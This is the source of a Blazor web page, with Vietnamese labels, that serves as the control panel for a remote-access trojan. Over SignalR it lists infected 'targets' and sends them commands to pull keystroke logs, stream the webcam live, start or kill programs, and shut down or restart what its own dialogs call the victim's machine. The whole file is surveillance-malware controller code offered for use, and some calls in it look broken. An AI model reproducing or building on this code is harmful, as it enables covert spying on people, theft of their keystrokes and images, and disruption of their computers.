@page "/"
@using Microsoft.AspNetCore.SignalR.Client
@inject NavigationManager NavigationManager

<PageTitle>MASTER CONTROLLER</PageTitle>

<style>
    body { font-family: sans-serif; }
    .main-container { display: flex; width: 100%; max-width: 1200px; margin: 0 auto; }
    .left-panel { width: 350px; padding: 10px; border-right: 1px solid #ccc; }
    .right-panel { flex-grow: 1; padding: 10px; }
    #log-output { height: 350px; border: 1px solid #ccc; overflow-y: scroll; padding: 5px; background: #f8f8f8; font-family: monospace; font-size: 12px; }
    #webcam-feed { width: 100%; height: auto; min-height: 450px; background: black; border: 2px solid #333; }
    .btn-group { margin-bottom: 15px; display: flex; gap: 5px; }
    .btn-lg { padding: 10px; font-weight: bold; width: 100%; }
    .app-input { display: flex; gap: 5px; margin-bottom: 10px; }
</style>

<div class="main-container">

    <div class="left-panel">

        <h2>MASTER CONTROLLER</h2>

        <div class="btn-group">
            <select @bind="SelectedTargetId" style="width: 100%; padding: 8px;">
                @if (ActiveClients.Count == 0)
                {
                    <option value="">Không có Target nào kết nối</option>
                }
                @foreach (var client in ActiveClients)
                {
                    <option value="@client">TARGET: @client</option>
                }
            </select>
        </div>

        <div id="log-output">
            @((MarkupString)LogMessages)
        </div>

        <div class="control-group">
            <h3>Điều khiển Ứng dụng (@ActiveClients.Count Target)</h3>
            <div class="app-input">
                <input type="text" @bind="AppNameOrPid" placeholder="Tên App/PID" style="flex-grow: 1; padding: 5px;">
                <button class="btn-lg" @onclick="() => SendAppCommand(" START")" style="background-color: lightgreen;">MỞ</button>
                <button class="btn-lg" @onclick="() => SendAppCommand(" STOP")" style="background-color: lightcoral;">TẮT</button>
            </div>
            <div class="btn-group">
                <button class="btn-lg" @onclick="() => SendCommand(" LIST")" style="background-color: lightblue;">XEM DS APP</button>
                <button class="btn-lg" @onclick="() => SendCommand(" KEYLOG")" style="background-color: orange;">LẤY KEYLOG</button>
            </div>
        </div>

    </div>

    <div class="right-panel">
        <h2>WEBCAM VÀ POWER CONTROL</h2>
        <img id="webcam-feed" src="@WebcamFeedSrc" alt="Webcam Feed" />

        <div class="btn-group" style="margin-top: 10px;">
            <button class="btn-lg" @onclick="() => SendCommand(" WEBCAM_ON")" style="background-color: red; color: white;">BẬT CAM LIVE</button>
            <button class="btn-lg" @onclick="() => SendCommand(" WEBCAM_OFF")">NGẮT CAM</button>
            <button class="btn-lg" @onclick="ConfirmPowerShutdown" style="background-color: darkred; color: white;">TẮT MÁY</button>
            <button class="btn-lg" @onclick="ConfirmPowerRestart" style="background-color: darkorange; color: white;">RESTART</button>
        </div>
    </div>
</div>


@code {
    // --- STATE MANAGEMENT ---
    private HubConnection? hubConnection;
    private string LogMessages = "";
    private string WebcamFeedSrc = "data:image/jpeg;base64,";
    private string SelectedTargetId = "";
    private string AppNameOrPid = "notepad";
    private List<string> ActiveClients = new List<string>();


    // --- LIFECYCLE: KHỞI TẠO KẾT NỐI SIGNALR ---
    protected override async Task OnInitializedAsync()
    {
        // Địa chỉ kết nối đến Backend Server
        hubConnection = new HubConnectionBuilder()
            .WithUrl(NavigationManager.ToAbsoluteUri("/controlhub"))
            .WithAutomaticReconnect()
            .Build();

        // 1. Nhận Log và Keylog
        hubConnection.On<string>("ReceiveLog", (message) =>
        {
            LogMessages += $"[{DateTime.Now.ToString("HH:mm:ss")}] {message}<br/>";
            // Giới hạn số lượng log
            if (LogMessages.Length > 10000) LogMessages = LogMessages.Substring(LogMessages.Length - 10000);
            StateHasChanged(); // Bắt buộc phải gọi để cập nhật UI
        });

        // 2. Nhận Webcam
        hubConnection.On<string>("ReceiveWebcam", (base64Image) =>
        {
            WebcamFeedSrc = $"data:image/jpeg;base64,{base64Image}";
            StateHasChanged();
        });

        // 3. Quản lý Target Clients
        hubConnection.On<string>("ClientConnected", (clientId) =>
        {
            if (!ActiveClients.Contains(clientId)) ActiveClients.Add(clientId);
            if (string.IsNullOrEmpty(SelectedTargetId)) SelectedTargetId = clientId;
            StateHasChanged();
        });

        hubConnection.On<string>("ClientDisconnected", (clientId) =>
        {
            ActiveClients.Remove(clientId);
            if (SelectedTargetId == clientId && ActiveClients.Count > 0)
                SelectedTargetId = ActiveClients[0]; // Chuyển sang Target đầu tiên
            else if (ActiveClients.Count == 0)
                SelectedTargetId = "";
            StateHasChanged();
        });


        try
        {
            await hubConnection.StartAsync();
            LogMessages += "Đã kết nối thành công SignalR.<br/>";
        }
        catch (Exception ex)
        {
            LogMessages += $"[LỖI NGHIÊM TRỌNG] Không thể kết nối SignalR: {ex.Message}<br/>";
        }
    }


    // --- HÀM GỬI LỆNH ---
    private async Task SendCommand(string command)
    {
        if (hubConnection is null || hubConnection.State != HubConnectionState.Connected)
        {
            LogMessages += "[LỖI] Mất kết nối SignalR.<br/>";
            return;
        }

        if (string.IsNullOrEmpty(SelectedTargetId))
        {
            LogMessages += "[LỖI] Vui lòng chọn Target App để điều khiển.<br/>";
            return;
        }

        try
        {
            // Gọi phương thức SendCommand trên ControlHub
            await hubConnection.InvokeAsync("SendCommand", SelectedTargetId, command);
        }
        catch (Exception ex)
        {
            LogMessages += $"[LỖI GỬI LỆNH] {ex.Message}<br/>";
        }
    }

    private void SendAppCommand(string action)
    {
        if (string.IsNullOrEmpty(AppNameOrPid))
        {
            LogMessages += "[CẢNH BÁO] Vui lòng nhập Tên App hoặc PID.<br/>";
            return;
        }
        SendCommand($"{action}|{AppNameOrPid}");
    }

    private void ConfirmPowerShutdown()
    {
        if (SelectedTargetId != "" && OperatingSystem.IsBrowser() &&
            Microsoft.JSInterop.JSRuntimeExtensions.Invoke<bool>(null, "confirm", "Xác nhận TẮT máy nạn nhân ngay lập tức?"))
        {
            SendCommand("SHUTDOWN");
        }
    }

    private void ConfirmPowerRestart()
    {
        if (SelectedTargetId != "" && OperatingSystem.IsBrowser() &&
            Microsoft.JSInterop.JSRuntimeExtensions.Invoke<bool>(null, "confirm", "Xác nhận RESTART máy nạn nhân ngay lập tức?"))
        {
            SendCommand("RESTART");
        }
    }

    // --- CLEANUP ---
    public async ValueTask DisposeAsync()
    {
        if (hubConnection is not null)
        {
            await hubConnection.DisposeAsync();
        }
    }
}